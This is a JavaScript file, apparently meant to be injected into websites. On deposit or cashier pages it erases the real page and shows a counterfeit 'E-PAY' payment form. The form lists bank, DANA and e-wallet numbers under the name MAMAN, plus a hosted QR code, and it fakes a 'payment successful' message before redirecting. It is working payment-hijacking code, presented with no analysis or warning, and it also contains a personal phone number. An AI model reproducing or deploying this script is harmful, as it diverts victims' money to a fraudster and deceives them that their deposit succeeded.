(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  // Hapus konten lama dengan cara yang lebih aman
  document.documentElement.innerHTML = '<!DOCTYPE html><html><head></head><body></body></html>';

  // =============== STYLE & FONT ===============
  document.head.innerHTML = `
    <title>PAYMENT GATEWAY | E-PAY</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --primary: #4361ee;
        --secondary: #3f37c9;
        --accent: #4895ef;
        --success: #4cc9f0;
        --warning: #f7e733;
        --danger: #f72585;
      }
      
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }
      
      body {
        font-family: 'Poppins', sans-serif;
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        color: #fff;
        min-height: 100vh;
        padding: 20px;
      }
      
      .payment-container {
        max-width: 600px;
        margin: 0 auto;
        background: rgba(255, 255, 255, 0.05);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 30px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        border: 1px solid rgba(255, 255, 255, 0.1);
      }
      
      .payment-header {
        text-align: center;
        margin-bottom: 30px;
      }
      
      .payment-header h1 {
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 10px;
        background: linear-gradient(to right, var(--accent), var(--success));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      
      .payment-header p {
        color: rgba(255, 255, 255, 0.7);
        font-size: 14px;
      }
      
      .marquee {
        background: rgba(0, 0, 0, 0.3);
        padding: 10px;
        border-radius: 8px;
        margin-bottom: 20px;
        overflow: hidden;
      }
      
      .marquee span {
        display: inline-block;
        white-space: nowrap;
        padding-left: 100%;
        animation: marquee 15s linear infinite;
        font-size: 12px;
        color: var(--warning);
      }
      
      @keyframes marquee {
        0% { transform: translate(0, 0); }
        100% { transform: translate(-100%, 0); }
      }
      
      .payment-methods {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
        gap: 15px;
        margin-bottom: 30px;
      }
      
      .method {
        background: rgba(255, 255, 255, 0.1);
        border-radius: 10px;
        padding: 15px;
        text-align: center;
        cursor: pointer;
        transition: all 0.3s ease;
        border: 2px solid transparent;
      }
      
      .method:hover {
        transform: translateY(-5px);
        background: rgba(255, 255, 255, 0.15);
      }
      
      .method.active {
        border-color: var(--accent);
        background: rgba(67, 97, 238, 0.2);
      }
      
      .method i {
        font-size: 30px;
        margin-bottom: 10px;
        display: block;
      }
      
      .method .bank-icon {
        width: 30px;
        height: 30px;
        margin: 0 auto 10px;
        display: block;
      }
      
      .payment-content {
        margin-top: 20px;
      }
      
      .qr-container {
        text-align: center;
        margin: 20px 0;
      }
      
      .qr-code {
        width: 200px;
        height: 200px;
        margin: 0 auto;
        background: #fff;
        padding: 10px;
        border-radius: 10px;
      }
      
      .form-group {
        margin-bottom: 20px;
      }
      
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: 500;
      }
      
      .form-control {
        width: 100%;
        padding: 12px 15px;
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(255, 255, 255, 0.2);
        border-radius: 8px;
        color: #fff;
        font-size: 16px;
        transition: all 0.3s;
      }
      
      .form-control:focus {
        outline: none;
        border-color: var(--accent);
        box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.3);
      }
      
      .btn {
        display: inline-block;
        padding: 12px 25px;
        background: linear-gradient(to right, var(--primary), var(--secondary));
        color: white;
        border: none;
        border-radius: 8px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s;
        width: 100%;
        text-align: center;
      }
      
      .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
      }
      
      .btn-secondary {
        background: rgba(255, 255, 255, 0.1);
      }
      
      .btn-secondary:hover {
        background: rgba(255, 255, 255, 0.2);
      }
      
      .payment-footer {
        margin-top: 30px;
        text-align: center;
        font-size: 12px;
        color: rgba(255, 255, 255, 0.6);
      }
      
      .payment-footer img {
        height: 40px;
        margin-top: 10px;
      }
      
      .copy-btn {
        background: var(--success);
        margin-top: 10px;
      }
      
      .status {
        margin-top: 15px;
        padding: 10px;
        border-radius: 5px;
        text-align: center;
        font-weight: 600;
      }
      
      .status.success {
        background: rgba(76, 201, 240, 0.2);
        color: var(--success);
      }
      
      .status.error {
        background: rgba(247, 37, 133, 0.2);
        color: var(--danger);
      }
      
      /* Responsive */
      @media (max-width: 576px) {
        .payment-container {
          padding: 20px;
          border-radius: 15px;
        }
        
        .payment-methods {
          grid-template-columns: 1fr 1fr;
        }
      }
    </style>
  `;

  // =============== BODY CONTENT ===============
  document.body.innerHTML = `
    <div class="payment-container">
      <div class="payment-header">
        <h1>E-PAY PAYMENT GATEWAY</h1>
        <p>Lakukan deposit dengan cepat dan aman</p>
      </div>
      
      <div class="marquee">
        <span><i class="fas fa-info-circle"></i> PINDAI QRIS > ISI NOMINAL > TRANSFER > KONFIRMASI | MIN. DEPOSIT Rp50.000 | KODE UNIK: 887</span>
      </div>
      
      <div class="payment-methods">
        <div class="method" data-method="bank">
          <i class="fas fa-university"></i>
          <span>Transfer Bank</span>
        </div>
        <div class="method" data-method="dana">
          <i class="fas fa-wallet"></i>
          <span>DANA</span>
        </div>
        <div class="method" data-method="ewallet">
          <i class="fas fa-mobile-alt"></i>
          <span>E-Wallet</span>
        </div>
        <div class="method" data-method="qris">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/1200px-Logo_QRIS.svg.png" class="bank-icon" alt="QRIS">
          <span>QRIS</span>
        </div>
      </div>
      
      <div class="payment-content" id="paymentContent">
        <!-- Konten akan diisi secara dinamis -->
        <div class="initial-message">
          <p style="text-align: center; color: rgba(255,255,255,0.7);">Silakan pilih metode pembayaran</p>
        </div>
      </div>
      
      <div class="payment-footer">
        <button class="btn btn-secondary" onclick="window.open('https://direct.lc.chat/19221814/','_blank')">
          <i class="fas fa-headset"></i> Bantuan Pelanggan
        </button>
        <p style="margin-top: 20px;">© 2023 E-PAY Payment Gateway. All rights reserved.</p>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/1200px-Logo_QRIS.svg.png" alt="Secure Payment">
      </div>
    </div>
  `;

  // =============== PAYMENT LOGIC ===============
  const paymentContent = document.getElementById('paymentContent');
  const methods = document.querySelectorAll('.method');
  
  // Data metode pembayaran
  const paymentData = {
    bank: {
      title: "Transfer Bank",
      instructions: `
        <div class="form-group">
          <label>Pilih Bank Tujuan</label>
          <select class="form-control">
            <option>BCA - 1234567890 (E-PAY)</option>
            <option>BRI - 0987654321 (E-PAY)</option>
            <option>Mandiri - 5678901234 (E-PAY)</option>
          </select>
        </div>
        <p style="margin-bottom: 15px; font-size: 14px; color: rgba(255,255,255,0.7);">
          <i class="fas fa-info-circle"></i> Transfer tepat sampai 3 digit terakhir. Contoh: Rp50.000<b>887</b>
        </p>
      `,
      qr: "https://iili.io/Faaq08b.png"
    },
    dana: {
      title: "DANA",
      instructions: `
        <div class="dana-info" style="background: rgba(0, 168, 107, 0.2); border-color: #00a86b; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
          <h3 style="color: #00a86b; margin-bottom: 10px;"><i class="fas fa-wallet"></i> DANA</h3>
          <p style="margin-bottom: 5px;">Nomor: <strong>082378639819</strong></p>
          <p>Atas Nama: <strong>MAMAN</strong></p>
        </div>
        <p style="margin-bottom: 15px; font-size: 14px; color: rgba(255,255,255,0.7);">
          <i class="fas fa-info-circle"></i> Transfer tepat sampai 3 digit terakhir. Contoh: Rp50.000<b>887</b>
        </p>
      `,
      qr: null
    },
    ewallet: {
      title: "E-Wallet",
      instructions: `
        <div class="form-group">
          <label>Pilih E-Wallet</label>
          <select class="form-control">
            <option>OVO - 082378639819</option>
            <option>GoPay - 082378639819</option>
            <option>ShopeePay - 082378639819</option>
            <option>LinkAja - 082378639819</option>
          </select>
        </div>
        <p style="margin-bottom: 15px; font-size: 14px; color: rgba(255,255,255,0.7);">
          <i class="fas fa-info-circle"></i> Transfer tepat sampai 3 digit terakhir. Contoh: Rp50.000<b>887</b>
        </p>
      `,
      qr: "https://iili.io/Faaq08b.png"
    },
    qris: {
      title: "QRIS",
      instructions: `
        <div class="qr-container">
          <p style="margin-bottom: 15px;">Scan QR Code berikut menggunakan aplikasi mobile banking atau e-wallet Anda</p>
          <img src="https://iili.io/Faaq08b.png" class="qr-code" alt="QR Code">
          <p style="margin-top: 15px; font-size: 14px; color: rgba(255,255,255,0.7);">
            <i class="fas fa-info-circle"></i> Kode unik akan otomatis tertera
          </p>
        </div>
      `,
      qr: "https://iili.io/Faaq08b.png"
    }
  };

  // Handle pemilihan metode
  methods.forEach(method => {
    method.addEventListener('click', function() {
      // Hapus active class dari semua method
      methods.forEach(m => m.classList.remove('active'));
      // Tambahkan active class ke method yang dipilih
      this.classList.add('active');
      
      const methodType = this.getAttribute('data-method');
      renderPaymentContent(methodType);
    });
  });

  // Render konten pembayaran
  function renderPaymentContent(method) {
    const data = paymentData[method];
    let html = `
      <h3 style="margin-bottom: 20px; color: var(--accent);">${data.title}</h3>
      ${data.instructions}
    `;
    
    // Tambahkan QR code jika ada
    if (data.qr) {
      html += `
        <div style="text-align: center; margin: 20px 0;">
          <button class="btn copy-btn" onclick="window.open('${data.qr}','_blank')">
            <i class="fas fa-download"></i> Download QR Code
          </button>
        </div>
      `;
    } else if (method === 'dana') {
      html += `
        <button class="btn copy-btn" onclick="copyToClipboard('082378639819')">
          <i class="fas fa-copy"></i> Salin Nomor DANA
        </button>
      `;
    }
    
    // Tambahkan form input nominal
    html += `
      <div class="form-group" style="margin-top: 25px;">
        <label for="amount">Jumlah Deposit</label>
        <input type="text" class="form-control" id="amount" placeholder="Rp50.000" autocomplete="off">
        <small style="display: block; margin-top: 5px; color: rgba(255,255,255,0.5);">Minimal deposit: Rp50.000</small>
      </div>
      
      <button class="btn" id="confirmBtn" style="margin-top: 15px;">
        <i class="fas fa-paper-plane"></i> Konfirmasi Pembayaran
      </button>
      
      <div id="status" class="status" style="display: none;"></div>
    `;
    
    paymentContent.innerHTML = html;
    
    // Tambahkan event listeners
    document.getElementById('amount').addEventListener('input', formatCurrency);
    document.getElementById('confirmBtn').addEventListener('click', confirmPayment);
  }

  // Format input nominal
  function formatCurrency(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value) {
      value = parseInt(value, 10).toLocaleString('id-ID');
      e.target.value = `Rp${value}`;
    } else {
      e.target.value = '';
    }
  }

  // Konfirmasi pembayaran
  function confirmPayment() {
    const amountInput = document.getElementById('amount');
    const statusDiv = document.getElementById('status');
    
    let amount = amountInput.value.replace(/\D/g, '');
    amount = parseInt(amount);
    
    if (!amount || amount < 50000) {
      statusDiv.style.display = 'block';
      statusDiv.className = 'status error';
      statusDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> Minimal deposit Rp50.000';
      return;
    }
    
    statusDiv.style.display = 'block';
    statusDiv.className = 'status success';
    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Sedang memproses pembayaran...';
    
    // Simulasi proses pembayaran
    setTimeout(() => {
      statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Pembayaran berhasil! Mengalihkan...';
      setTimeout(() => {
        window.location.href = '../';
      }, 2000);
    }, 1500);
  }

  // Fungsi copy ke clipboard
  window.copyToClipboard = function(text) {
    navigator.clipboard.writeText(text).then(() => {
      const statusDiv = document.getElementById('status') || document.createElement('div');
      statusDiv.style.display = 'block';
      statusDiv.className = 'status success';
      statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Berhasil disalin ke clipboard!';
      if (!document.getElementById('status')) {
        statusDiv.id = 'status';
        paymentContent.appendChild(statusDiv);
      }
      
      setTimeout(() => {
        statusDiv.style.display = 'none';
      }, 3000);
    });
  };
})();